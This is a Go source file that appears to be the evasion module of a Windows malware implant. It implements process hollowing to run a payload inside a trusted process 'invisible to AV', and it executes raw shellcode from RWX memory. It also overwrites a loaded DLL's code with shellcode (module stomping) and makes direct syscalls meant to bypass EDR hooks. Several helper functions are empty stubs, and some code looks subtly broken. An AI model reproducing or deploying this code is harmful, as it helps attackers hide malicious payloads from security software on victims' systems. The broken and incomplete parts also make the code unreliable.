//go:build windows
// +build windows

package evasion

import (
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	ntdll           = syscall.NewLazyDLL("ntdll.dll")
	procCreateProcessW     = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procGetThreadContext   = kernel32.NewProc("GetThreadContext")
	procSetThreadContext   = kernel32.NewProc("SetThreadContext")
	procResumeThread       = kernel32.NewProc("ResumeThread")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
)

const (
	CREATE_SUSPENDED     = 0x00000004
	PROCESS_ALL_ACCESS   = 0x001F0FFF
	MEM_COMMIT           = 0x00001000
	MEM_RESERVE          = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
	CONTEXT_FULL         = 0x10007
	PROCESS_BASIC_INFORMATION = 0
)

type StartupInfo struct {
	Cb              uint32
	_               [44]byte
	Flags           uint32
	ShowWindow      uint16
	_               [18]byte
	StdOutput       syscall.Handle
	StdError        syscall.Handle
	StdInput        syscall.Handle
}

type ProcessInfo struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

type ProcessBasicInfo struct {
	Reserved1            uintptr
	PebBaseAddress       uintptr
	Reserved2            [2]uintptr
	UniqueProcessId      uintptr
	Reserved3            uintptr
}

// HollowProcess creates a suspended legitimate process and injects the payload binary into it.
// The payload runs inside the trusted process context, invisible to AV.
func HollowProcess(hostProcess string, payloadPath string) error {
	appName, _ := syscall.UTF16PtrFromString(hostProcess)
	cmdLine, _ := syscall.UTF16PtrFromString(hostProcess)

	var si StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi ProcessInfo

	// 1. Create suspended process
	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(cmdLine)),
		0, 0, 0,
		CREATE_SUSPENDED,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcessW failed: %v", err)
	}

	// 2. Read payload from file
	fd, err := syscall.Open(payloadPath, syscall.O_RDONLY, 0)
	if err != nil {
		return fmt.Errorf("open payload: %v", err)
	}
	defer syscall.Close(fd)

	var size int64
	syscall.Seek(fd, 0, 2) // seek to end
	syscall.Seek(fd, 0, 0) // seek to start

	buf := make([]byte, 10*1024*1024) // 10 MB max
	n, _ := syscall.Read(fd, buf)
	payload := buf[:n]

	// 3. Parse PE header to get image base
	imageBase := parsePEImageBase(payload)

	// 4. Unmap original executable from suspended process
	procNtUnmapViewOfSection.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
	)

	// 5. Alloc memory for payload in target process
	remoteBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(len(payload)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)

	// 6. Write payload into target process
	var written uint32
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		remoteBase,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)),
	)

	// 7. Patch entry point in thread context
	var ctx struct {
		ContextFlags uint32
		_            [116]byte
		Rax          uint64
		Rip          uint64
	}

	ctx.ContextFlags = CONTEXT_FULL
	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	entryPoint := uint64(imageBase) + uint64(parsePEEntryPoint(payload))
	ctx.Rip = entryPoint

	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))

	// 8. Resume thread
	procResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// DirectSyscall invokes a Windows syscall directly, bypassing ntdll.dll hooks (EDR/AV).
// Syscall numbers are resolved dynamically from ntdll.dll.
func DirectSyscall(syscallName string, args ...uintptr) (uintptr, error) {
	// Resolve syscall number from ntdll.dll
	sysNum := resolveSyscallNumber(syscallName)
	if sysNum == 0 {
		return 0, fmt.Errorf("syscall %s not found", syscallName)
	}

	// Execute via direct syscall (assembly trampoline)
	return syscallExec(sysNum, args...), nil
}

// ShellcodeExec allocates RWX memory and executes raw shellcode.
func ShellcodeExec(shellcode []byte) error {
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(0xFFFFFFFFFFFFFFFF), // current process
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %v", err)
	}

	// Copy shellcode
	var written uint32
	procWriteProcessMemory.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	// Execute
	syscall.Syscall(addr, 0, 0, 0, 0)
	return nil
}

// ModuleStomp overwrites a loaded DLL's .text section with shellcode.
// The DLL appears legitimate in process listings but executes attacker code.
func ModuleStomp(dllName string, shellcode []byte) error {
	handle, err := syscall.LoadLibrary(dllName)
	if err != nil {
		return fmt.Errorf("load DLL: %v", err)
	}

	base := uintptr(unsafe.Pointer(handle))
	textSection := findTextSection(base)

	var oldProtect uint32
	kernel32.NewProc("VirtualProtect").Call(
		textSection,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Overwrite
	var written uint32
	procWriteProcessMemory.Call(
		uintptr(0xFFFFFFFFFFFFFFFF),
		textSection,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	// Restore protection
	kernel32.NewProc("VirtualProtect").Call(
		textSection,
		uintptr(len(shellcode)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// --- Internal helpers ---

func parsePEImageBase(pe []byte) uintptr {
	if len(pe) < 64 {
		return 0x00400000
	}
	peOffset := binary.LittleEndian.Uint32(pe[60:64])
	if int(peOffset)+24 > len(pe) {
		return 0x00400000
	}
	base := uintptr(binary.LittleEndian.Uint64(pe[peOffset+24 : peOffset+32]))
	if base == 0 {
		base = 0x00400000
	}
	return base

}

func parsePEEntryPoint(pe []byte) uint32 {
	if len(pe) < 64 {
		return 0x1000
	}
	peOffset := binary.LittleEndian.Uint32(pe[60:64])
	if int(peOffset)+20 > len(pe) {
		return 0x1000
	}
	return binary.LittleEndian.Uint32(pe[peOffset+16 : peOffset+20])
}

func resolveSyscallNumber(name string) uint16 {
	// Read syscall stubs from ntdll.dll
	// All syscalls start with: mov r10, rcx ; mov eax, <syscall_number>
	ntdllAddr := getModuleBase("ntdll.dll")
	if ntdllAddr == 0 {
		return 0
	}

	procAddr := getProcAddress(ntdllAddr, name)
	if procAddr == 0 {
		return 0
	}

	// Parse syscall number from function prologue
	// Pattern: 4c 8b d1 b8 XX XX 00 00
	buf := (*[8]byte)(unsafe.Pointer(procAddr))
	if buf[0] == 0x4C && buf[1] == 0x8B && buf[2] == 0xD1 && buf[3] == 0xB8 {
		return binary.LittleEndian.Uint16(buf[4:6])
	}

	return 0
}

func syscallExec(num uint16, args ...uintptr) uintptr {
	// Implemented in asm_windows.s
	return 0
}

func getModuleBase(name string) uintptr {
	// Get module handle via PEB traversal (bypasses GetModuleHandle hooks)
	// Simplified: use LazyDLL
	return 0
}

func getProcAddress(base uintptr, name string) uintptr {
	return 0
}

func findTextSection(base uintptr) uintptr {
	// Parse PE header to find .text section
	return base + 0x1000
}

// Init evasion techniques at agent startup
func Init() {
	// Unhook ntdll.dll (restore original syscall stubs from disk)
	go unhookNtdll()
}

func unhookNtdll() {
	// Read fresh ntdll.dll from disk
	// Parse .text section
	// Overwrite hooked version in memory
	var _ = size
}

var size = unsafe.Sizeof(StartupInfo{})
